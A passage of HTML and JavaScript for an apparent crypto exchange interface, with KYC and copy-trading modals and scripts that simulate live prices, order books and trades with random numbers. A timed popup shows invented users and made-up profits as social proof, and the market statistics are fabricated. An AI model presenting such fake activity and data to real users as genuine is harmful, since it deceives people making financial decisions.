        <div><div style="font-size:13px;font-weight:600">Step 2: Selfie / Liveness Check</div><div style="font-size:11px;color:var(--text3)">Take a selfie holding your ID document</div></div>
        <button class="btn btn-outline" style="margin-left:auto;font-size:11px;padding:5px 10px" onclick="showToast('ðŸ“¸ Camera access required','blue')">Start</button>
      </div>
      <div style="display:flex;align-items:center;gap:12px;padding:12px;background:var(--bg3);border-radius:var(--r-lg)">
        <div style="font-size:24px">ðŸ </div>
        <div><div style="font-size:13px;font-weight:600">Step 3: Proof of Address</div><div style="font-size:11px;color:var(--text3)">Bank statement or utility bill â€” last 3 months</div></div>
        <button class="btn btn-outline" style="margin-left:auto;font-size:11px;padding:5px 10px" onclick="showToast('ðŸ“„ Upload proof of address','blue')">Upload</button>
      </div>
    </div>
    <div style="font-size:11px;color:var(--text3);margin-bottom:16px">âš¡ Most verifications complete in under 5 minutes. Your data is encrypted and secure.</div>
    <button class="btn-auth" onclick="closeModal('kycModal');showToast('ðŸ†” KYC submitted! Under review â€” typically 5 minutes.','blue')">Submit for Review</button>
    <button class="btn btn-outline" style="width:100%;margin-top:8px" onclick="closeModal('kycModal')">Later</button>
  </div>
</div>

<!-- CREATE BOT MODAL -->
<div id="createBotModal" style="display:none" class="modal-overlay" onclick="if(event.target===this)closeModal('createBotModal')">
  <div class="modal-box">
    <div class="modal-title">âš™ï¸ Create Custom Bot</div>
    <div class="form-group">
      <label class="form-label">Bot Type</label>
      <select class="form-input" style="padding-left:14px">
        <option>Grid Bot â€” Range-bound markets</option>
        <option>DCA Bot â€” Periodic buying</option>
        <option>Momentum Bot â€” Trend following</option>
        <option>Arbitrage Bot â€” Price differences</option>
      </select>
    </div>
    <div class="form-group">
      <label class="form-label">Trading Pair</label>
      <select class="form-input" style="padding-left:14px">
        <option>BTC/USDT</option><option>ETH/USDT</option><option>SOL/USDT</option><option>BNB/USDT</option>
      </select>
    </div>
    <div class="form-group">
      <label class="form-label">Initial Investment (USDT)</label>
      <div class="op-input-wrap" style="border:1px solid var(--border);border-radius:var(--r-md);background:var(--bg2)">
        <span style="padding:0 12px;color:var(--text3)">$</span>
        <input type="number" class="op-input" placeholder="500" min="50">
        <span class="op-input-suffix">USDT</span>
      </div>
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
      <div class="form-group">
        <label class="form-label">Lower Price</label>
        <input type="number" class="form-input" style="padding-left:14px" placeholder="60000">
      </div>
      <div class="form-group">
        <label class="form-label">Upper Price</label>
        <input type="number" class="form-input" style="padding-left:14px" placeholder="75000">
      </div>
    </div>
    <div class="modal-actions">
      <button class="btn btn-outline" onclick="closeModal('createBotModal')" style="flex:1">Cancel</button>
      <button class="btn btn-green" onclick="saveCustomBot()" style="flex:2">ðŸš€ Launch Bot</button>
    </div>
  </div>
</div>

<!-- COPY TRADE MODAL -->
<div id="copyTradeModal" style="display:none" class="modal-overlay" onclick="if(event.target===this)closeModal('copyTradeModal')">
  <div class="modal-box">
    <div class="modal-title" id="ctmTitle">ðŸ‘¥ Copy Trader</div>
    <div id="ctmBody"></div>
    <div class="form-group" style="margin-top:12px">
      <label class="form-label">Copy Allocation (USDT)</label>
      <div class="op-input-wrap" style="border:1px solid var(--border);border-radius:var(--r-md);background:var(--bg2)">
        <span style="padding:0 12px;color:var(--text3)">$</span>
        <input type="number" class="op-input" id="ctmAlloc" placeholder="Min $10" min="10">
        <span class="op-input-suffix">USDT</span>
      </div>
      <div style="font-size:11px;color:var(--text3);margin-top:4px">Available: <strong style="color:var(--text1)">$8,250.00</strong></div>
    </div>
    <div style="display:flex;align-items:center;gap:8px;padding:10px;background:var(--bg3);border-radius:var(--r-md);margin-bottom:12px;font-size:12px;color:var(--text2)">
      <span>âš ï¸</span> Copy trading does not guarantee profits. Past performance is not indicative of future results.
    </div>
    <div class="modal-actions">
      <button class="btn btn-outline" onclick="closeModal('copyTradeModal')" style="flex:1">Cancel</button>
      <button class="btn btn-green" id="ctmConfirmBtn" onclick="confirmCopyTrade()" style="flex:2">Start Copying</button>
    </div>
  </div>
</div>

<!-- FILL NOTIFICATION (hidden) -->
<div id="fillNotification" style="display:none" class="fill-notification">
  <div class="fill-icon" id="fillIcon">âœ…</div>
  <div>
    <div class="fill-text" id="fillText">Order Filled!</div>
    <div class="fill-sub" id="fillSub">Your order has been executed</div>
  </div>
</div>

<!-- SESSION WARNING -->
<div id="sessionWarning" style="display:none" class="session-warning">
  <div class="session-box">
    <div style="font-size:48px;margin-bottom:12px">â°</div>
    <div style="font-family:var(--font-display);font-size:20px;font-weight:800;margin-bottom:8px">Session Expiring</div>
    <div style="font-size:14px;color:var(--text2);margin-bottom:16px">You'll be logged out in <strong style="color:var(--yellow);font-family:var(--font-mono)" id="sessionCountdown">60</strong> seconds due to inactivity.</div>
    <div style="display:flex;gap:10px">
      <button class="btn btn-outline" onclick="doLogout()" style="flex:1">Sign Out</button>
      <button class="btn btn-green" onclick="extendSession()" style="flex:2">Stay Logged In</button>
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• JAVASCRIPT â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<script>
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// STATE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const STATE = {
  loggedIn: false,
  user: { name:'', email:'', balance:12500, demoBalance:100000, mode:'live', refCode:'USER123' },
  prices: { 'BTC/USDT':67420.50,'ETH/USDT':3542.80,'BNB/USDT':412.30,'SOL/USDT':182.70,'XRP/USDT':0.6124,'ADA/USDT':0.4821,'DOGE/USDT':0.1642,'AVAX/USDT':38.42,'MATIC/USDT':0.8821,'DOT/USDT':7.24,'LINK/USDT':16.84,'UNI/USDT':8.42,'ATOM/USDT':9.14,'LTC/USDT':89.20,'NEAR/USDT':4.82 },
  changes: {},
  selectedPair: 'BTC/USDT',
  orderSide: 'buy',
  orderType: 'limit',
  leverage: 10,
  positions: [],
  orders: [],
  priceAlerts: [],
  bots: {},
  copyTraders: {},
  notifications: 3,
  streak: 7,
  xp: 2450,
  currentTrader: null
};

// init changes
Object.keys(STATE.prices).forEach(p => {
  STATE.changes[p] = (Math.random()*8-2).toFixed(2);
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CORE UTILS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function $(id){ return document.getElementById(id); }
function showLayer(id){
  document.querySelectorAll('.layer').forEach(l=>l.classList.remove('active'));
  const el = $(id);
  if(el){ el.classList.add('active'); window.scrollTo(0,0); }
  updateMBN(id);
}
function showToast(msg, type='green', dur=3500){
  const t=$('toast');
  t.textContent=msg;
  t.className='show toast-'+type;
  clearTimeout(t._t);
  t._t=setTimeout(()=>{t.className='';},dur);
}
function closeModal(id){ $(id).style.display='none'; }
function openModal(id){ $(id).style.display='flex'; }
function formatNum(n,dec=2){ return parseFloat(n).toLocaleString('en-US',{minimumFractionDigits:dec,maximumFractionDigits:dec}); }
function formatUSD(n){ return '$'+formatNum(n,2); }
function formatPct(n){ return (n>=0?'+':'')+parseFloat(n).toFixed(2)+'%'; }
function rand(min,max){ return Math.random()*(max-min)+min; }
function randInt(min,max){ return Math.floor(rand(min,max+1)); }
function pick(arr){ return arr[randInt(0,arr.length-1)]; }

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// LAYER NAV HELPERS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function updateMBN(layerId){
  const map={welcomeLayer:0,chartLayer:1,tradingLayer:2,dashboardLayer:3,signalsLayer:4};
  const items=document.querySelectorAll('.mbn-item');
  items.forEach((it,i)=>it.classList.toggle('active',i===map[layerId]));
}
function setMBN(el){
  document.querySelectorAll('.mbn-item').forEach(i=>i.classList.remove('active'));
  el.classList.add('active');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PRICE ENGINE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function tickPrices(){
  Object.keys(STATE.prices).forEach(pair=>{
    const move = (Math.random()-0.495)*(STATE.prices[pair]*0.0008);
    STATE.prices[pair] = Math.max(STATE.prices[pair]+move, 0.0001);
    const base = STATE.prices[pair]/(1+(parseFloat(STATE.changes[pair])/100));
    STATE.changes[pair] = ((STATE.prices[pair]-base)/base*100).toFixed(2);
  });
  updateAllPriceDisplays();
}
setInterval(tickPrices, 1200);

function updateAllPriceDisplays(){
  const btc = STATE.prices['BTC/USDT'];
  const btcChg = parseFloat(STATE.changes['BTC/USDT']);
  // navbar ticker
  buildNavTicker();
  // welcome stats
  const sp=$('statBtcPrice');
  if(sp) sp.textContent=formatUSD(btc);
  // chart layer
  const cp=$('chartPrice');
  if(cp){ cp.textContent=formatUSD(STATE.prices[STATE.selectedPair]); cp.className='ph-price '+(parseFloat(STATE.changes[STATE.selectedPair])>=0?'up':'down'); }
  const cc=$('chartChange');
  if(cc){ const c=parseFloat(STATE.changes[STATE.selectedPair]); cc.textContent=formatPct(c); cc.className='ph-change '+(c>=0?'up':'down'); }
  // trading layer
  const tp=$('tpsPrice'), tc=$('tpsChg'), ti=$('tradingIndexPrice'), tm=$('tradingMarkPrice');
  if(tp){ tp.textContent=formatUSD(STATE.prices['BTC/USDT']); }
  if(tc){ const c=parseFloat(STATE.changes['BTC/USDT']); tc.textContent=formatPct(c); tc.className='tps-chg '+(c>=0?'up':'down'); }
  if(ti) ti.textContent=formatUSD(STATE.prices['BTC/USDT']-rand(0.5,3));
  if(tm) tm.textContent=formatUSD(STATE.prices['BTC/USDT']);
  const mm=$('miniObMid');
  if(mm) mm.textContent=formatUSD(STATE.prices['BTC/USDT']);
  // order price
  const op=$('orderPrice');
  if(op && document.activeElement!==op) op.value=STATE.prices['BTC/USDT'].toFixed(2);
  // ob spread
  const osp=$('obSpreadPrice');
  if(osp) osp.textContent=formatUSD(STATE.prices[STATE.selectedPair]);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// TICKERS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function buildNavTicker(){
  const track=$('navTicker');
  if(!track) return;
  const pairs=Object.keys(STATE.prices).slice(0,10);
  let html='';
  pairs.forEach(p=>{
    const chg=parseFloat(STATE.changes[p]);
    html+=`<div class="nt-item" onclick="STATE.selectedPair='${p}';showLayer('chartLayer')">
      <span class="nt-sym">${p.replace('/USDT','')}</span>
      <span class="nt-price">${formatUSD(STATE.prices[p])}</span>
      <span class="nt-chg ${chg>=0?'nt-up':'nt-dn'}">${formatPct(chg)}</span>
    </div>`;
  });
  // duplicate for seamless loop
  track.innerHTML=html+html;
}

function buildMarketBar(){
  const track=$('marketBarTrack');
  if(!track) return;
  const pairs=Object.keys(STATE.prices);
  let html='';
  pairs.forEach(p=>{
    const chg=parseFloat(STATE.changes[p]);
    html+=`<div class="mb-item"><span class="mb-sym">${p}</span><span class="mb-price">${formatUSD(STATE.prices[p])}</span><span class="mb-chg ${chg>=0?'nt-up':'nt-dn'}">${formatPct(chg)}</span></div>`;
  });
  track.innerHTML=html+html;
}

function buildGSB(){
  const track=$('gsbTrack');
  if(!track) return;
  const items=[
    {lbl:'Crypto Market Cap',val:'$2.41T',chg:'+1.24%',up:true},
    {lbl:'24h Volume',val:'$142.8B',chg:'+8.3%',up:true},
    {lbl:'BTC Dominance',val:'52.4%',chg:'+0.3%',up:true},
    {lbl:'ETH Dominance',val:'16.8%',chg:'-0.2%',up:false},
    {lbl:'Fear & Greed',val:'72 Greed',chg:'',up:true},
    {lbl:'Active Addresses',val:'1.24M',chg:'+5.1%',up:true},
    {lbl:'Hash Rate',val:'620 EH/s',chg:'+2.1%',up:true},
    {lbl:'DeFi TVL',val:'$98.4B',chg:'+3.2%',up:true},
    {lbl:'Stablecoin Cap',val:'$168B',chg:'+0.8%',up:true},
    {lbl:'NFT Volume 24h',val:'$42M',chg:'-12%',up:false},
  ];
  let html='';
  items.forEach((it,i)=>{
    if(i>0) html+=`<div class="gsb-divider"></div>`;
    html+=`<div class="gsb-item"><span class="gsb-lbl">${it.lbl}</span><span class="gsb-val">${it.val}</span>${it.chg?`<span class="gsb-chg ${it.up?'up':'down'}">${it.chg}</span>`:''}</div>`;
  });
  track.innerHTML=html+html;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ORDER BOOK
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function buildOrderBook(){
  const price=STATE.prices[STATE.selectedPair];
  let asksHTML='', bidsHTML='';
  let cumAsk=0, cumBid=0;
  for(let i=0;i<16;i++){
    const askP=(price*(1+rand(0.0001,0.004)*(i+1))).toFixed(2);
    const askA=rand(0.01,2.5).toFixed(4);
    cumAsk+=parseFloat(askA);
    asksHTML+=`<div class="ob-row"><span class="ob-price ask">${askP}</span><span class="ob-amt">${askA}</span><span class="ob-total">${cumAsk.toFixed(3)}</span></div>`;
  }
  for(let i=0;i<16;i++){
    const bidP=(price*(1-rand(0.0001,0.004)*(i+1))).toFixed(2);
    const bidA=rand(0.01,3.2).toFixed(4);
    cumBid+=parseFloat(bidA);
    bidsHTML+=`<div class="ob-row"><span class="ob-price bid">${bidP}</span><span class="ob-amt">${bidA}</span><span class="ob-total">${cumBid.toFixed(3)}</span></div>`;
  }
  const asks=$('obAsks'), bids=$('obBids');
  if(asks) asks.innerHTML=asksHTML;
  if(bids) bids.innerHTML=bidsHTML;
  // mini OB
  let miniAsks='', miniBids='';
  for(let i=0;i<6;i++){
    const p=(price*(1+rand(0.0001,0.002)*(i+1))).toFixed(2);
    const a=rand(0.01,1.5).toFixed(3);
    miniAsks+=`<div class="ob-row"><span class="ob-price ask">${p}</span><span class="ob-amt">${a}</span><span></span></div>`;
  }
  for(let i=0;i<6;i++){
    const p=(price*(1-rand(0.0001,0.002)*(i+1))).toFixed(2);
    const a=rand(0.01,2).toFixed(3);
    miniBids+=`<div class="ob-row"><span class="ob-price bid">${p}</span><span class="ob-amt">${a}</span><span></span></div>`;
  }
  const ma=$('miniObAsks'), mb=$('miniObBids');
  if(ma) ma.innerHTML=miniAsks;
  if(mb) mb.innerHTML=miniBids;
}
setInterval(buildOrderBook, 1500);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// TRADES FEED
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function addTrade(){
  const price=STATE.prices['BTC/USDT'];
  const isBuy=Math.random()>0.5;
  const p=(price+(Math.random()-0.5)*8).toFixed(2);
  const a=rand(0.001,0.8).toFixed(4);
  const now=new Date();
  const t=`${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;
  const row=`<div class="tp-row"><span class="tp-price ${isBuy?'buy':'sell'}">${p}</span><span class="tp-amt">${a}</span><span class="tp-time">${t}</span></div>`;
  const feed=$('tpFeed');
  if(feed){ feed.insertAdjacentHTML('afterbegin',row); if(feed.children.length>50) feed.lastChild?.remove(); }
  const mf=$('miniTradesFeed');
  if(mf){ mf.insertAdjacentHTML('afterbegin',row); if(mf.children.length>20) mf.lastChild?.remove(); }
}
setInterval(addTrade, 700);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CHARTS (Canvas)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
let tvChart=null, tvSeries=null, tvTradingChart=null, tvTradingSeries=null;

function initTVChart(){
  if(typeof LightweightCharts==='undefined') return;
  const container=$('tvChartContainer');
  if(!container||tvChart) return;
  tvChart=LightweightCharts.createChart(container,{
    width:container.clientWidth, height:container.clientHeight||400,
    layout:{background:{color:'#06080D'},textColor:'#8892A4'},
    grid:{vertLines:{color:'rgba(255,255,255,0.04)'},horzLines:{color:'rgba(255,255,255,0.04)'}},
    crosshair:{mode:LightweightCharts.CrosshairMode.Normal},
    rightPriceScale:{borderColor:'rgba(255,255,255,0.08)'},
    timeScale:{borderColor:'rgba(255,255,255,0.08)',timeVisible:true},
  });
  tvSeries=tvChart.addCandlestickSeries({
    upColor:'#00E676',downColor:'#FF3D57',borderUpColor:'#00E676',borderDownColor:'#FF3D57',wickUpColor:'#00E676',wickDownColor:'#FF3D57'
  });
  tvSeries.setData(generateCandles(200));
  new ResizeObserver(()=>tvChart.resize(container.clientWidth,container.clientHeight)).observe(container);
}

function initTVTradingChart(){
  if(typeof LightweightCharts==='undefined') return;
  const container=$('tvTradingChart');
  if(!container||tvTradingChart) return;
  tvTradingChart=LightweightCharts.createChart(container,{
    width:container.clientWidth, height:container.clientHeight||300,
    layout:{background:{color:'#06080D'},textColor:'#8892A4'},
    grid:{vertLines:{color:'rgba(255,255,255,0.04)'},horzLines:{color:'rgba(255,255,255,0.04)'}},
    crosshair:{mode:LightweightCharts.CrosshairMode.Normal},
    rightPriceScale:{borderColor:'rgba(255,255,255,0.08)'},
    timeScale:{borderColor:'rgba(255,255,255,0.08)',timeVisible:true},
  });
  tvTradingSeries=tvTradingChart.addCandlestickSeries({
    upColor:'#00E676',downColor:'#FF3D57',borderUpColor:'#00E676',borderDownColor:'#FF3D57',wickUpColor:'#00E676',wickDownColor:'#FF3D57'
  });
  tvTradingSeries.setData(generateCandles(150));
  new ResizeObserver(()=>tvTradingChart.resize(container.clientWidth,container.clientHeight)).observe(container);
}

function generateCandles(n){
  const candles=[];
  let t=Math.floor(Date.now()/1000)-n*14400;
  let price=rand(60000,70000);
  for(let i=0;i<n;i++){
    const o=price;
    const c=o+(Math.random()-0.48)*rand(200,1200);
    const h=Math.max(o,c)+rand(50,500);
    const l=Math.min(o,c)-rand(50,500);
    candles.push({time:t,open:o,high:h,low:l,close:c});
    price=c; t+=14400;
  }
  return candles;
}

// Update charts with new candle
setInterval(()=>{
  const price=STATE.prices['BTC/USDT'];
  const t=Math.floor(Date.now()/1000);
  [tvSeries, tvTradingSeries].forEach(s=>{
    if(s) try{ s.update({time:t-t%14400,open:price-rand(50,300),high:price+rand(100,400),low:price-rand(100,400),close:price}); }catch(e){}
  });
},5000);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DEPTH CHART
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function drawDepthChart(){
  const canvas=$('depthCanvas');
  if(!canvas) return;
  const ctx=canvas.getContext('2d');
  const W=canvas.offsetWidth, H=canvas.offsetHeight;
  canvas.width=W; canvas.height=H;
  ctx.clearRect(0,0,W,H);
  const price=STATE.prices[STATE.selectedPair];
  // bids (left half)
  const bg=ctx.createLinearGradient(0,0,W/2,0);
  bg.addColorStop(0,'rgba(0,230,118,0)');
  bg.addColorStop(1,'rgba(0,230,118,0.15)');
  ctx.beginPath(); ctx.moveTo(0,H);
  for(let i=0;i<20;i++){ ctx.lineTo(i*(W/2/20), H-(Math.random()*0.5+0.1)*H); }
  ctx.lineTo(W/2,H); ctx.closePath();
  ctx.fillStyle=bg; ctx.fill();
  // asks (right half)
  const ra=ctx.createLinearGradient(W/2,0,W,0);
  ra.addColorStop(0,'rgba(255,61,87,0.15)');
  ra.addColorStop(1,'rgba(255,61,87,0)');
  ctx.beginPath(); ctx.moveTo(W/2,H);
  for(let i=0;i<20;i++){ ctx.lineTo(W/2+i*(W/2/20), H-(Math.random()*0.5+0.1)*H); }
  ctx.lineTo(W,H); ctx.closePath();
  ctx.fillStyle=ra; ctx.fill();
  // mid line
  ctx.strokeStyle='rgba(255,255,255,0.2)'; ctx.lineWidth=1;
  ctx.beginPath(); ctx.moveTo(W/2,0); ctx.lineTo(W/2,H); ctx.stroke();
}
setInterval(drawDepthChart, 2000);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PERFORMANCE CHART
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function drawPerfChart(){
  const canvas=$('perfChart');
  if(!canvas) return;
  const ctx=canvas.getContext('2d');
  const W=canvas.offsetWidth||400, H=canvas.offsetHeight||180;
  canvas.width=W; canvas.height=H;
  ctx.clearRect(0,0,W,H);
  const pts=[];
  let v=10000;
  for(let i=0;i<30;i++){ v+=rand(-200,400); pts.push(v); }
  const mn=Math.min(...pts)-200, mx=Math.max(...pts)+200;
  const sx=W/(pts.length-1);
  const sy=n=>H-((n-mn)/(mx-mn))*(H-20)-10;
  const grad=ctx.createLinearGradient(0,0,0,H);
  grad.addColorStop(0,'rgba(0,230,118,0.2)');
  grad.addColorStop(1,'rgba(0,230,118,0)');
  ctx.beginPath(); ctx.moveTo(0,sy(pts[0]));
  pts.forEach((p,i)=>ctx.lineTo(i*sx,sy(p)));
  ctx.lineTo(W,H); ctx.lineTo(0,H); ctx.closePath();
  ctx.fillStyle=grad; ctx.fill();
  ctx.beginPath(); ctx.moveTo(0,sy(pts[0]));
  pts.forEach((p,i)=>ctx.lineTo(i*sx,sy(p)));
  ctx.strokeStyle='#00E676'; ctx.lineWidth=2; ctx.stroke();
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ALLOCATION CHART
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const ALLOC_DATA=[
  {name:'Bitcoin',sym:'BTC',pct:45,color:'#F7931A'},
  {name:'Ethereum',sym:'ETH',pct:25,color:'#627EEA'},
  {name:'Solana',sym:'SOL',pct:10,color:'#00FFA3'},
  {name:'BNB',sym:'BNB',pct:8,color:'#F3BA2F'},
  {name:'XRP',sym:'XRP',pct:6,color:'#00AAE4'},
  {name:'USDT',sym:'USDT',pct:4,color:'#26A17B'},
  {name:'Other',sym:'etc',pct:2,color:'#4A5568'},
];
function drawAllocChart(){
  const canvas=$('allocChart');
  if(!canvas) return;
  const ctx=canvas.getContext('2d');
  const S=140; canvas.width=S; canvas.height=S;
  const cx=S/2, cy=S/2, r=56, ir=38;
  let angle=-Math.PI/2;
  ALLOC_DATA.forEach(d=>{
    const slice=(d.pct/100)*Math.PI*2;
    ctx.beginPath(); ctx.moveTo(cx,cy);
    ctx.arc(cx,cy,r,angle,angle+slice); ctx.closePath();
    ctx.fillStyle=d.color; ctx.fill();
    angle+=slice;
  });
  ctx.beginPath(); ctx.arc(cx,cy,ir,0,Math.PI*2);
  ctx.fillStyle='#0C0F18'; ctx.fill();
  const legend=$('allocLegend');
  if(legend){
    legend.innerHTML=ALLOC_DATA.map(d=>`
      <div class="al-row">
        <div class="al-dot" style="background:${d.color}"></div>
        <span class="al-name">${d.name}</span>
        <span class="al-pct">${d.pct}%</span>
      </div>`).join('');
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BALANCE MINI CHART
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function drawBalMiniChart(){
  const canvas=$('balMiniChart');
  if(!canvas) return;
  const ctx=canvas.getContext('2d');
  const W=canvas.offsetWidth||200, H=40;
  canvas.width=W; canvas.height=H;
  ctx.clearRect(0,0,W,H);
  const pts=[]; let v=0;
  for(let i=0;i<20;i++){ v+=rand(-1,2); pts.push(v); }
  const mn=Math.min(...pts), mx=Math.max(...pts)||1;
  const sx=W/(pts.length-1);
  const sy=n=>H-((n-mn)/(mx-mn||1))*(H-4)-2;
  ctx.beginPath(); ctx.moveTo(0,sy(pts[0]));
  pts.forEach((p,i)=>ctx.lineTo(i*sx,sy(p)));
  ctx.strokeStyle='rgba(0,230,118,0.6)'; ctx.lineWidth=1.5; ctx.stroke();
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SOCIAL PROOF POPUP
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const SP_NAMES=['Alex from NY','Maria from London','David from Berlin','Yuki from Tokyo','Carlos from Madrid','Emma from Paris','James from Sydney','Aisha from Dubai','Raj from Mumbai','Sophie from Amsterdam'];
const SP_ACTIONS=['just made a profit','closed a winning trade','withdrew funds','started copy trading','activated a bot','referred a friend'];
const SP_AMOUNTS=['+$42','withdrew $1,200','+$380','+$89','earned $24','+$640','+$1,840','+$210','earned $55','+$4,200'];
let spTimeout;
function showSP(){
  const popup=$('spPopup');
  if(!popup) return;
  popup.classList.remove('hide');
  $('spTitle').textContent=pick(SP_NAMES);
  const action=pick(SP_ACTIONS);
  $('spSub').textContent=action;
  const amt=pick(SP_AMOUNTS);
  $('spAmount').textContent=amt;
  $('spAmount').style.color=amt.startsWith('+')? 'var(--green)':'var(--blue)';
  $('spIcon').textContent=pick(['ðŸŽ‰','ðŸ’°','ðŸš€','âš¡','ðŸ¤‘','ðŸ’Ž']);
  clearTimeout(spTimeout);
  spTimeout=setTimeout(dismissSP, 5000);
}
function dismissSP(){ const p=$('spPopup'); if(p){ p.classList.add('hide'); setTimeout(()=>p.classList.remove('hide'),500); } }
setInterval(showSP, 8000);
setTimeout(showSP, 3000);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// TRADERS TRACK
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
